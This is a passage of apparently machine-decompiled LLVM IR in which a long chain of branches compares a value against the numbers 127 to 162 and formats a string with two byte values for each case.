  %v7_c910 = icmp eq i32 %v2_acd8, 127
  br i1 %v7_c910, label %dec_label_pc_c918, label %dec_label_pc_c940

dec_label_pc_c918:                                ; preds = %dec_label_pc_c90c
  %v2_c918 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c924 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c930 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c93c = sext i8 %v3_c924 to i32
  %v6_c93c = sext i8 %v3_c930 to i32
  %v8_c93c = call i32 @szprintf(i32 %v2_c918, i32 ptrtoint ([14 x i8]* @global_var_1f070.322 to i32), i32 %v4_c93c, i32 %v6_c93c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %dec_label_pc_c90c, %dec_label_pc_c918
  %v7_c944 = icmp eq i32 %v2_acd8, 128
  br i1 %v7_c944, label %dec_label_pc_c94c, label %dec_label_pc_c974

dec_label_pc_c94c:                                ; preds = %dec_label_pc_c940
  %v2_c94c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c958 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c964 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c970 = sext i8 %v3_c958 to i32
  %v6_c970 = sext i8 %v3_c964 to i32
  %v8_c970 = call i32 @szprintf(i32 %v2_c94c, i32 ptrtoint ([14 x i8]* @global_var_1f080.324 to i32), i32 %v4_c970, i32 %v6_c970, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c974

dec_label_pc_c974:                                ; preds = %dec_label_pc_c940, %dec_label_pc_c94c
  %v7_c978 = icmp eq i32 %v2_acd8, 129
  br i1 %v7_c978, label %dec_label_pc_c980, label %dec_label_pc_c9a8

dec_label_pc_c980:                                ; preds = %dec_label_pc_c974
  %v2_c980 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c98c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c998 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c9a4 = sext i8 %v3_c98c to i32
  %v6_c9a4 = sext i8 %v3_c998 to i32
  %v8_c9a4 = call i32 @szprintf(i32 %v2_c980, i32 ptrtoint ([14 x i8]* @global_var_1f090.326 to i32), i32 %v4_c9a4, i32 %v6_c9a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9a8

dec_label_pc_c9a8:                                ; preds = %dec_label_pc_c974, %dec_label_pc_c980
  %v7_c9ac = icmp eq i32 %v2_acd8, 130
  br i1 %v7_c9ac, label %dec_label_pc_c9b4, label %dec_label_pc_c9dc

dec_label_pc_c9b4:                                ; preds = %dec_label_pc_c9a8
  %v2_c9b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9c0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c9cc = load i8, i8* @global_var_299ba.79, align 1
  %v4_c9d8 = sext i8 %v3_c9c0 to i32
  %v6_c9d8 = sext i8 %v3_c9cc to i32
  %v8_c9d8 = call i32 @szprintf(i32 %v2_c9b4, i32 ptrtoint ([14 x i8]* @global_var_1f0a0.328 to i32), i32 %v4_c9d8, i32 %v6_c9d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9dc

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_c9a8, %dec_label_pc_c9b4
  %v7_c9e0 = icmp eq i32 %v2_acd8, 131
  br i1 %v7_c9e0, label %dec_label_pc_c9e8, label %dec_label_pc_ca10

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c9dc
  %v2_c9e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9f4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ca00 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ca0c = sext i8 %v3_c9f4 to i32
  %v6_ca0c = sext i8 %v3_ca00 to i32
  %v8_ca0c = call i32 @szprintf(i32 %v2_c9e8, i32 ptrtoint ([14 x i8]* @global_var_1f0b0.330 to i32), i32 %v4_ca0c, i32 %v6_ca0c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c9dc, %dec_label_pc_c9e8
  %v7_ca14 = icmp eq i32 %v2_acd8, 132
  br i1 %v7_ca14, label %dec_label_pc_ca1c, label %dec_label_pc_ca44

dec_label_pc_ca1c:                                ; preds = %dec_label_pc_ca10
  %v2_ca1c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca28 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ca34 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ca40 = sext i8 %v3_ca28 to i32
  %v6_ca40 = sext i8 %v3_ca34 to i32
  %v8_ca40 = call i32 @szprintf(i32 %v2_ca1c, i32 ptrtoint ([14 x i8]* @global_var_1f0c0.332 to i32), i32 %v4_ca40, i32 %v6_ca40, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca10, %dec_label_pc_ca1c
  %v7_ca48 = icmp eq i32 %v2_acd8, 133
  br i1 %v7_ca48, label %dec_label_pc_ca50, label %dec_label_pc_ca78

dec_label_pc_ca50:                                ; preds = %dec_label_pc_ca44
  %v2_ca50 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca5c = load i8, i8* @global_var_299b9.78, align 1
  %v3_ca68 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ca74 = sext i8 %v3_ca5c to i32
  %v6_ca74 = sext i8 %v3_ca68 to i32
  %v8_ca74 = call i32 @szprintf(i32 %v2_ca50, i32 ptrtoint ([14 x i8]* @global_var_1f0d0.334 to i32), i32 %v4_ca74, i32 %v6_ca74, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca78

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_ca50
  %v7_ca7c = icmp eq i32 %v2_acd8, 134
  br i1 %v7_ca7c, label %dec_label_pc_ca84, label %dec_label_pc_caac

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca78
  %v2_ca84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca90 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ca9c = load i8, i8* @global_var_299ba.79, align 1
  %v4_caa8 = sext i8 %v3_ca90 to i32
  %v6_caa8 = sext i8 %v3_ca9c to i32
  %v8_caa8 = call i32 @szprintf(i32 %v2_ca84, i32 ptrtoint ([14 x i8]* @global_var_1f0e0.336 to i32), i32 %v4_caa8, i32 %v6_caa8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_caac

dec_label_pc_caac:                                ; preds = %dec_label_pc_ca78, %dec_label_pc_ca84
  %v7_cab0 = icmp eq i32 %v2_acd8, 135
  br i1 %v7_cab0, label %dec_label_pc_cab8, label %dec_label_pc_cae0

dec_label_pc_cab8:                                ; preds = %dec_label_pc_caac
  %v2_cab8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cac4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cad0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cadc = sext i8 %v3_cac4 to i32
  %v6_cadc = sext i8 %v3_cad0 to i32
  %v8_cadc = call i32 @szprintf(i32 %v2_cab8, i32 ptrtoint ([14 x i8]* @global_var_1f0f0.338 to i32), i32 %v4_cadc, i32 %v6_cadc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cae0

dec_label_pc_cae0:                                ; preds = %dec_label_pc_caac, %dec_label_pc_cab8
  %v7_cae4 = icmp eq i32 %v2_acd8, 136
  br i1 %v7_cae4, label %dec_label_pc_caec, label %dec_label_pc_cb14

dec_label_pc_caec:                                ; preds = %dec_label_pc_cae0
  %v2_caec = ptrtoint i32* %stack_var_-36 to i32
  %v3_caf8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cb04 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cb10 = sext i8 %v3_caf8 to i32
  %v6_cb10 = sext i8 %v3_cb04 to i32
  %v8_cb10 = call i32 @szprintf(i32 %v2_caec, i32 ptrtoint ([14 x i8]* @global_var_1f100.340 to i32), i32 %v4_cb10, i32 %v6_cb10, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb14

dec_label_pc_cb14:                                ; preds = %dec_label_pc_cae0, %dec_label_pc_caec
  %v7_cb18 = icmp eq i32 %v2_acd8, 137
  br i1 %v7_cb18, label %dec_label_pc_cb20, label %dec_label_pc_cb48

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cb14
  %v2_cb20 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb2c = load i8, i8* @global_var_299b9.78, align 1
  %v3_cb38 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cb44 = sext i8 %v3_cb2c to i32
  %v6_cb44 = sext i8 %v3_cb38 to i32
  %v8_cb44 = call i32 @szprintf(i32 %v2_cb20, i32 ptrtoint ([13 x i8]* @global_var_1f110.342 to i32), i32 %v4_cb44, i32 %v6_cb44, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb48

dec_label_pc_cb48:                                ; preds = %dec_label_pc_cb14, %dec_label_pc_cb20
  %v7_cb4c = icmp eq i32 %v2_acd8, 138
  br i1 %v7_cb4c, label %dec_label_pc_cb54, label %dec_label_pc_cb7c

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb48
  %v2_cb54 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb60 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cb6c = load i8, i8* @global_var_299ba.79, align 1
  %v4_cb78 = sext i8 %v3_cb60 to i32
  %v6_cb78 = sext i8 %v3_cb6c to i32
  %v8_cb78 = call i32 @szprintf(i32 %v2_cb54, i32 ptrtoint ([13 x i8]* @global_var_1f120.344 to i32), i32 %v4_cb78, i32 %v6_cb78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_cb48, %dec_label_pc_cb54
  %v7_cb80 = icmp eq i32 %v2_acd8, 139
  br i1 %v7_cb80, label %dec_label_pc_cb88, label %dec_label_pc_cbb0

dec_label_pc_cb88:                                ; preds = %dec_label_pc_cb7c
  %v2_cb88 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb94 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cba0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cbac = sext i8 %v3_cb94 to i32
  %v6_cbac = sext i8 %v3_cba0 to i32
  %v8_cbac = call i32 @szprintf(i32 %v2_cb88, i32 ptrtoint ([13 x i8]* @global_var_1f130.346 to i32), i32 %v4_cbac, i32 %v6_cbac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbb0

dec_label_pc_cbb0:                                ; preds = %dec_label_pc_cb7c, %dec_label_pc_cb88
  %v7_cbb4 = icmp eq i32 %v2_acd8, 140
  br i1 %v7_cbb4, label %dec_label_pc_cbbc, label %dec_label_pc_cbe4

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cbb0
  %v2_cbbc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbc8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cbd4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cbe0 = sext i8 %v3_cbc8 to i32
  %v6_cbe0 = sext i8 %v3_cbd4 to i32
  %v8_cbe0 = call i32 @szprintf(i32 %v2_cbbc, i32 ptrtoint ([13 x i8]* @global_var_1f140.348 to i32), i32 %v4_cbe0, i32 %v6_cbe0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %dec_label_pc_cbb0, %dec_label_pc_cbbc
  %v7_cbe8 = icmp eq i32 %v2_acd8, 141
  br i1 %v7_cbe8, label %dec_label_pc_cbf0, label %dec_label_pc_cc18

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbe4
  %v2_cbf0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbfc = load i8, i8* @global_var_299b9.78, align 1
  %v3_cc08 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cc14 = sext i8 %v3_cbfc to i32
  %v6_cc14 = sext i8 %v3_cc08 to i32
  %v8_cc14 = call i32 @szprintf(i32 %v2_cbf0, i32 ptrtoint ([13 x i8]* @global_var_1f150.350 to i32), i32 %v4_cc14, i32 %v6_cc14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc18

dec_label_pc_cc18:                                ; preds = %dec_label_pc_cbe4, %dec_label_pc_cbf0
  %v7_cc1c = icmp eq i32 %v2_acd8, 142
  br i1 %v7_cc1c, label %dec_label_pc_cc24, label %dec_label_pc_cc4c

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cc18
  %v2_cc24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc30 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cc3c = load i8, i8* @global_var_299ba.79, align 1
  %v4_cc48 = sext i8 %v3_cc30 to i32
  %v6_cc48 = sext i8 %v3_cc3c to i32
  %v8_cc48 = call i32 @szprintf(i32 %v2_cc24, i32 ptrtoint ([13 x i8]* @global_var_1f160.352 to i32), i32 %v4_cc48, i32 %v6_cc48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc18, %dec_label_pc_cc24
  %v7_cc50 = icmp eq i32 %v2_acd8, 143
  br i1 %v7_cc50, label %dec_label_pc_cc58, label %dec_label_pc_cc80

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc4c
  %v2_cc58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc64 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cc70 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cc7c = sext i8 %v3_cc64 to i32
  %v6_cc7c = sext i8 %v3_cc70 to i32
  %v8_cc7c = call i32 @szprintf(i32 %v2_cc58, i32 ptrtoint ([14 x i8]* @global_var_1f050.318 to i32), i32 %v4_cc7c, i32 %v6_cc7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc80

dec_label_pc_cc80:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_cc58
  %v7_cc84 = icmp eq i32 %v2_acd8, 144
  br i1 %v7_cc84, label %dec_label_pc_cc8c, label %dec_label_pc_ccb4

dec_label_pc_cc8c:                                ; preds = %dec_label_pc_cc80
  %v2_cc8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc98 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cca4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ccb0 = sext i8 %v3_cc98 to i32
  %v6_ccb0 = sext i8 %v3_cca4 to i32
  %v8_ccb0 = call i32 @szprintf(i32 %v2_cc8c, i32 ptrtoint ([14 x i8]* @global_var_1f170.354 to i32), i32 %v4_ccb0, i32 %v6_ccb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccb4

dec_label_pc_ccb4:                                ; preds = %dec_label_pc_cc80, %dec_label_pc_cc8c
  %v7_ccb8 = icmp eq i32 %v2_acd8, 145
  br i1 %v7_ccb8, label %dec_label_pc_ccc0, label %dec_label_pc_cce8

dec_label_pc_ccc0:                                ; preds = %dec_label_pc_ccb4
  %v2_ccc0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cccc = load i8, i8* @global_var_299b9.78, align 1
  %v3_ccd8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cce4 = sext i8 %v3_cccc to i32
  %v6_cce4 = sext i8 %v3_ccd8 to i32
  %v8_cce4 = call i32 @szprintf(i32 %v2_ccc0, i32 ptrtoint ([14 x i8]* @global_var_1f180.356 to i32), i32 %v4_cce4, i32 %v6_cce4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cce8

dec_label_pc_cce8:                                ; preds = %dec_label_pc_ccb4, %dec_label_pc_ccc0
  %v7_ccec = icmp eq i32 %v2_acd8, 146
  br i1 %v7_ccec, label %dec_label_pc_ccf4, label %dec_label_pc_cd1c

dec_label_pc_ccf4:                                ; preds = %dec_label_pc_cce8
  %v2_ccf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd00 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cd0c = load i8, i8* @global_var_299ba.79, align 1
  %v4_cd18 = sext i8 %v3_cd00 to i32
  %v6_cd18 = sext i8 %v3_cd0c to i32
  %v8_cd18 = call i32 @szprintf(i32 %v2_ccf4, i32 ptrtoint ([14 x i8]* @global_var_1f190.358 to i32), i32 %v4_cd18, i32 %v6_cd18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cce8, %dec_label_pc_ccf4
  %v7_cd20 = icmp eq i32 %v2_acd8, 147
  br i1 %v7_cd20, label %dec_label_pc_cd28, label %dec_label_pc_cd50

dec_label_pc_cd28:                                ; preds = %dec_label_pc_cd1c
  %v2_cd28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd34 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cd40 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cd4c = sext i8 %v3_cd34 to i32
  %v6_cd4c = sext i8 %v3_cd40 to i32
  %v8_cd4c = call i32 @szprintf(i32 %v2_cd28, i32 ptrtoint ([13 x i8]* @global_var_1f1a0.360 to i32), i32 %v4_cd4c, i32 %v6_cd4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd1c, %dec_label_pc_cd28
  %v7_cd54 = icmp eq i32 %v2_acd8, 148
  br i1 %v7_cd54, label %dec_label_pc_cd5c, label %dec_label_pc_cd84

dec_label_pc_cd5c:                                ; preds = %dec_label_pc_cd50
  %v2_cd5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd68 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cd74 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cd80 = sext i8 %v3_cd68 to i32
  %v6_cd80 = sext i8 %v3_cd74 to i32
  %v8_cd80 = call i32 @szprintf(i32 %v2_cd5c, i32 ptrtoint ([14 x i8]* @global_var_1f1b0.362 to i32), i32 %v4_cd80, i32 %v6_cd80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd84

dec_label_pc_cd84:                                ; preds = %dec_label_pc_cd50, %dec_label_pc_cd5c
  %v7_cd88 = icmp eq i32 %v2_acd8, 149
  br i1 %v7_cd88, label %dec_label_pc_cd90, label %dec_label_pc_cdb8

dec_label_pc_cd90:                                ; preds = %dec_label_pc_cd84
  %v2_cd90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd9c = load i8, i8* @global_var_299b9.78, align 1
  %v3_cda8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cdb4 = sext i8 %v3_cd9c to i32
  %v6_cdb4 = sext i8 %v3_cda8 to i32
  %v8_cdb4 = call i32 @szprintf(i32 %v2_cd90, i32 ptrtoint ([14 x i8]* @global_var_1f1c0.365 to i32), i32 %v4_cdb4, i32 %v6_cdb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdb8

dec_label_pc_cdb8:                                ; preds = %dec_label_pc_cd84, %dec_label_pc_cd90
  %v7_cdbc = icmp eq i32 %v2_acd8, 150
  br i1 %v7_cdbc, label %dec_label_pc_cdc4, label %dec_label_pc_cdec

dec_label_pc_cdc4:                                ; preds = %dec_label_pc_cdb8
  %v2_cdc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdd0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cddc = load i8, i8* @global_var_299ba.79, align 1
  %v4_cde8 = sext i8 %v3_cdd0 to i32
  %v6_cde8 = sext i8 %v3_cddc to i32
  %v8_cde8 = call i32 @szprintf(i32 %v2_cdc4, i32 ptrtoint ([14 x i8]* @global_var_1f1d0.367 to i32), i32 %v4_cde8, i32 %v6_cde8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cdb8, %dec_label_pc_cdc4
  %v7_cdf0 = icmp eq i32 %v2_acd8, 151
  br i1 %v7_cdf0, label %dec_label_pc_cdf8, label %dec_label_pc_ce20

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_cdec
  %v2_cdf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce04 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ce10 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ce1c = sext i8 %v3_ce04 to i32
  %v6_ce1c = sext i8 %v3_ce10 to i32
  %v8_ce1c = call i32 @szprintf(i32 %v2_cdf8, i32 ptrtoint ([14 x i8]* @global_var_1f1e0.369 to i32), i32 %v4_ce1c, i32 %v6_ce1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce20

dec_label_pc_ce20:                                ; preds = %dec_label_pc_cdec, %dec_label_pc_cdf8
  %v7_ce24 = icmp eq i32 %v2_acd8, 152
  br i1 %v7_ce24, label %dec_label_pc_ce2c, label %dec_label_pc_ce54

dec_label_pc_ce2c:                                ; preds = %dec_label_pc_ce20
  %v2_ce2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce38 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ce44 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ce50 = sext i8 %v3_ce38 to i32
  %v6_ce50 = sext i8 %v3_ce44 to i32
  %v8_ce50 = call i32 @szprintf(i32 %v2_ce2c, i32 ptrtoint ([14 x i8]* @global_var_1efc4.300 to i32), i32 %v4_ce50, i32 %v6_ce50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce54

dec_label_pc_ce54:                                ; preds = %dec_label_pc_ce20, %dec_label_pc_ce2c
  %v7_ce58 = icmp eq i32 %v2_acd8, 153
  br i1 %v7_ce58, label %dec_label_pc_ce60, label %dec_label_pc_ce88

dec_label_pc_ce60:                                ; preds = %dec_label_pc_ce54
  %v2_ce60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce6c = load i8, i8* @global_var_299b9.78, align 1
  %v3_ce78 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ce84 = sext i8 %v3_ce6c to i32
  %v6_ce84 = sext i8 %v3_ce78 to i32
  %v8_ce84 = call i32 @szprintf(i32 %v2_ce60, i32 ptrtoint ([13 x i8]* @global_var_1f1f0.372 to i32), i32 %v4_ce84, i32 %v6_ce84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce88

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce54, %dec_label_pc_ce60
  %v7_ce8c = icmp eq i32 %v2_acd8, 154
  br i1 %v7_ce8c, label %dec_label_pc_ce94, label %dec_label_pc_cebc

dec_label_pc_ce94:                                ; preds = %dec_label_pc_ce88
  %v2_ce94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cea0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ceac = load i8, i8* @global_var_299ba.79, align 1
  %v4_ceb8 = sext i8 %v3_cea0 to i32
  %v6_ceb8 = sext i8 %v3_ceac to i32
  %v8_ceb8 = call i32 @szprintf(i32 %v2_ce94, i32 ptrtoint ([13 x i8]* @global_var_1f200.374 to i32), i32 %v4_ceb8, i32 %v6_ceb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cebc

dec_label_pc_cebc:                                ; preds = %dec_label_pc_ce88, %dec_label_pc_ce94
  %v7_cec0 = icmp eq i32 %v2_acd8, 155
  br i1 %v7_cec0, label %dec_label_pc_cec8, label %dec_label_pc_cef0

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cebc
  %v2_cec8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ced4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cee0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ceec = sext i8 %v3_ced4 to i32
  %v6_ceec = sext i8 %v3_cee0 to i32
  %v8_ceec = call i32 @szprintf(i32 %v2_cec8, i32 ptrtoint ([13 x i8]* @global_var_1f210.376 to i32), i32 %v4_ceec, i32 %v6_ceec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cef0

dec_label_pc_cef0:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cec8
  %v7_cef4 = icmp eq i32 %v2_acd8, 156
  br i1 %v7_cef4, label %dec_label_pc_cefc, label %dec_label_pc_cf24

dec_label_pc_cefc:                                ; preds = %dec_label_pc_cef0
  %v2_cefc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf08 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cf14 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cf20 = sext i8 %v3_cf08 to i32
  %v6_cf20 = sext i8 %v3_cf14 to i32
  %v8_cf20 = call i32 @szprintf(i32 %v2_cefc, i32 ptrtoint ([13 x i8]* @global_var_1f220.378 to i32), i32 %v4_cf20, i32 %v6_cf20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %dec_label_pc_cef0, %dec_label_pc_cefc
  %v7_cf28 = icmp eq i32 %v2_acd8, 157
  br i1 %v7_cf28, label %dec_label_pc_cf30, label %dec_label_pc_cf58

dec_label_pc_cf30:                                ; preds = %dec_label_pc_cf24
  %v2_cf30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf3c = load i8, i8* @global_var_299b9.78, align 1
  %v3_cf48 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cf54 = sext i8 %v3_cf3c to i32
  %v6_cf54 = sext i8 %v3_cf48 to i32
  %v8_cf54 = call i32 @szprintf(i32 %v2_cf30, i32 ptrtoint ([14 x i8]* @global_var_1f230.380 to i32), i32 %v4_cf54, i32 %v6_cf54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf58

dec_label_pc_cf58:                                ; preds = %dec_label_pc_cf24, %dec_label_pc_cf30
  %v7_cf5c = icmp eq i32 %v2_acd8, 158
  br i1 %v7_cf5c, label %dec_label_pc_cf64, label %dec_label_pc_cf8c

dec_label_pc_cf64:                                ; preds = %dec_label_pc_cf58
  %v2_cf64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf70 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cf7c = load i8, i8* @global_var_299ba.79, align 1
  %v4_cf88 = sext i8 %v3_cf70 to i32
  %v6_cf88 = sext i8 %v3_cf7c to i32
  %v8_cf88 = call i32 @szprintf(i32 %v2_cf64, i32 ptrtoint ([12 x i8]* @global_var_1f240.382 to i32), i32 %v4_cf88, i32 %v6_cf88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf8c

dec_label_pc_cf8c:                                ; preds = %dec_label_pc_cf58, %dec_label_pc_cf64
  %v7_cf90 = icmp eq i32 %v2_acd8, 159
  br i1 %v7_cf90, label %dec_label_pc_cf98, label %dec_label_pc_cfc0

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf8c
  %v2_cf98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfa4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cfb0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cfbc = sext i8 %v3_cfa4 to i32
  %v6_cfbc = sext i8 %v3_cfb0 to i32
  %v8_cfbc = call i32 @szprintf(i32 %v2_cf98, i32 ptrtoint ([14 x i8]* @global_var_1f24c.384 to i32), i32 %v4_cfbc, i32 %v6_cfbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cf8c, %dec_label_pc_cf98
  %v7_cfc4 = icmp eq i32 %v2_acd8, 160
  br i1 %v7_cfc4, label %dec_label_pc_cfcc, label %dec_label_pc_cff4

dec_label_pc_cfcc:                                ; preds = %dec_label_pc_cfc0
  %v2_cfcc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfd8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_cfe4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_cff0 = sext i8 %v3_cfd8 to i32
  %v6_cff0 = sext i8 %v3_cfe4 to i32
  %v8_cff0 = call i32 @szprintf(i32 %v2_cfcc, i32 ptrtoint ([13 x i8]* @global_var_1f25c.386 to i32), i32 %v4_cff0, i32 %v6_cff0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cfc0, %dec_label_pc_cfcc
  %v7_cff8 = icmp eq i32 %v2_acd8, 161
  br i1 %v7_cff8, label %dec_label_pc_d000, label %dec_label_pc_d028

dec_label_pc_d000:                                ; preds = %dec_label_pc_cff4
  %v2_d000 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d00c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d018 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d024 = sext i8 %v3_d00c to i32
  %v6_d024 = sext i8 %v3_d018 to i32
  %v8_d024 = call i32 @szprintf(i32 %v2_d000, i32 ptrtoint ([14 x i8]* @global_var_1f26c.388 to i32), i32 %v4_d024, i32 %v6_d024, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d000
  %v7_d02c = icmp eq i32 %v2_acd8, 162
  br i1 %v7_d02c, label %dec_label_pc_d034, label %dec_label_pc_d05c

dec_label_pc_d034:                                ; preds = %dec_label_pc_d028
  %v2_d034 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d040 = load i8, i8* @global_var_299b9.78, align 1
